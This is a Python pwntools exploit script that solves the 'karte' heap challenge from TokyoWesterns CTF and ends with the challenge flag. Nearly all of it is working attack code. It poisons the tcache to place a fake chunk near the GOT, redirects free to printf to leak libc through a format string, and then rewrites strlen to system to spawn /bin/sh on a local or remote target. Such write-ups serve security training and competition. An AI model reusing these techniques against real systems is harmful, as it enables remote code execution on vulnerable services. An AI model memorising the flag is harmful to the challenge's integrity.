from pwn import *

MENU = ("!#!#!#!#!#!#!#!#!#\n"
        "> ")


def add(io, size, data):
    io.sendlineafter(MENU, "1")
    io.sendlineafter("Input size > ", str(size))
    io.sendafter("Input description > ", data)
    io.recvuntil("Added id ")
    _id = io.recvline().strip("\n")
    return _id

def delete(io, _id):
    io.sendlineafter(MENU, "3")
    io.sendlineafter("Input id > ", str(_id))
    return io.recvuntil("Deleted id {}\n".format(str(_id)))

def modify(io, _id, data, recvall = True):
    io.sendlineafter(MENU, "4")
    io.sendlineafter("Input id > ", str(_id))
    io.sendafter("Input new description > ", data)
    if recvall:
        io.recvuntil("\nModified id {}\n".format(str(_id)))



def exploit():
    fake_chunk = 0x602155
    free_got = 0x602018
    printf_plt = 0x400760
    strlen_got = 0x602028

    local = 1
    LIBC = ELF("./libc-karte")
    if local :
        io = process("./karte")
    else:
        io = remote("karte.chal.ctf.westerns.tokyo", 10001)
    io.sendlineafter("Input patient name... ", '...')

    for i in range(7):
        id0 = add(io, 0x60, 'A'*8)
        delete(io, id0)



    a = add(io, 0x60, 'a')
    b = add(io, 0xfffff, 'a')
    c = add(io, 0x60, 'a')

    delete(io, a)
    delete(io, c)
    delete(io, b)


    #no aslr heap has 3 bytes
    #with aslr heap has 4bytes more often

    if local:
        modify(io, c, p64(fake_chunk)[:3])

    else:
        modify(io, c, p64(fake_chunk)[:4])

    a = add(io, 0x60, '%13$p'+';/bin/sh\x00')
    b = add(io, 0x60, 'D'*11 + p64(0xdeadc0bebeef))
    chunk_id = b


    modify(io, chunk_id, 'D'*3 + p64(free_got))

    byte = int(c) & 0xff
    modify(io, str(0x44444400 + byte), p64(printf_plt)[:6])

    libc_start_main = int(delete(io, a).split(";")[0], 16) - 231
    libc = libc_start_main - LIBC.symbols["__libc_start_main"]
    system = libc + LIBC.symbols["system"]

    log.info("libc start main {}".format(hex(libc_start_main)))
    log.info("libc {}".format(hex(libc)))
    log.info("system {}".format(hex(system)))


    modify(io, chunk_id, 'D'*3 + p64(strlen_got)[:3])
    modify(io, str(0x44444400 + byte), p64(system)[:6])

    modify(io, a, "", recvall = False)


    io.interactive()
    io.close()


exploit()
#TWCTF{pr1n7l355_15_50_53cur3!}
